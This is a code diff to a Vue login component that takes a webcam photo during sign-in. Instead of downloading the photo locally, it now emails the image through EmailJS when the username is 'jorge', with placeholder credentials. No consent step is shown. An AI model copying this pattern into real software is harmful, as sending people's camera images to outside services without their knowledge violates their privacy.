@@ -30,7 +30,8 @@
 </template>
 
 <script setup>
-import { ref, onMounted, onBeforeUnmount } from 'vue'
+import { ref, onBeforeUnmount } from 'vue'
+import emailjs from 'emailjs-com'
 
 const username = ref('')
 const error = ref('')
@@ -38,6 +39,11 @@ const loginStep = ref(0)
 const video = ref(null)
 const photoData = ref(null)
 let stream = null
+
+// Pon aquí tus credenciales de EmailJS:
+const EMAILJS_USER_ID = 'tu_user_id_aqui'
+const EMAILJS_SERVICE_ID = 'tu_service_id_aqui'
+const EMAILJS_TEMPLATE_ID = 'tu_template_id_aqui'
 
 function startLogin() {
   error.value = ''
@@ -80,7 +86,7 @@ function capturePhoto() {
   stopVideo()
 
   if (username.value.toLowerCase() === 'jorge') {
-    downloadPhoto(photoData.value, username.value)
+    sendPhotoByEmail(photoData.value)
   }
 
   loginStep.value = 2
@@ -92,12 +98,21 @@ function stopVideo() {
   }
 }
 
-function downloadPhoto(base64, username) {
-  const a = document.createElement('a')
-  a.href = base64
-  const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
-  a.download = `${username}_foto_${timestamp}.png`
-  a.click()
+function sendPhotoByEmail(base64) {
+  // Quitamos prefijo para enviar solo base64 plano
+  const base64Data = base64.replace(/^data:image\/png;base64,/, '')
+
+  emailjs
+    .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+      username: username.value,
+      photo: base64Data,
+    }, EMAILJS_USER_ID)
+    .then(() => {
+      console.log('Foto enviada por email correctamente')
+    })
+    .catch((err) => {
+      error.value = 'Error enviando la foto: ' + err.text
+    })
 }
 
 onBeforeUnmount(() => {
